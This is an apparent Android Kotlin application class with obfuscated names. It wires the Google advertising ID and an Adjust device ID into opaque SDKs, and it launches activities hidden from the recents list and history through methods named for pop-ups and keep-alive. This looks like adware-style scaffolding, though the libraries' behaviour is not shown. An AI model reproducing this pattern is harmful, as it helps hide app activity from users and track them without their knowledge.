package a

import android.app.Application
import android.content.Intent
import android.os.Bundle
import com.amour.Amour
import com.example.overseaswhitebag.common.utils.AdjustTokens
import yias.nchxo.tbi.base.BaseApplication
import yias.nchxo.tbi.base.OverseaAppInitializer.appBaseContext
import yias.edma.eah.SPUtils
import yias.edma.eah.adjust.AdJustTokenAFUtils
import com.tanout.TAN

class PRYY : BaseApplication() {

    companion object {
        var isBackgroundLaunch: Boolean = false

        @JvmStatic
        var appInstance: PRYY? = null
    }

    override fun onCreate() {
        super.onCreate()
        appInstance = this
    }

    override fun configureAdjustTokens() {
        AdjustTokens.initAdJustToken(this)
    }

    override fun openLaunchByOther(bundle: Bundle?, intent: Intent) {
        intent.addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION)
        intent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
        intent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY)
        TAN.Tan(appBaseContext, intent, null as Class<*>?)

    }

    override fun initPopPower() {
        TAN.Init(appBaseContext)
    }

    override fun initKeepPower(app: Application) {
        Amour.Init(app,SPUtils.getGoogleAdId(), SPUtils.getAdjustDeviceId())
        AdJustTokenAFUtils.showBhInit(SPUtils.getGoogleAdId(),SPUtils.getAdjustDeviceId())
    }
}
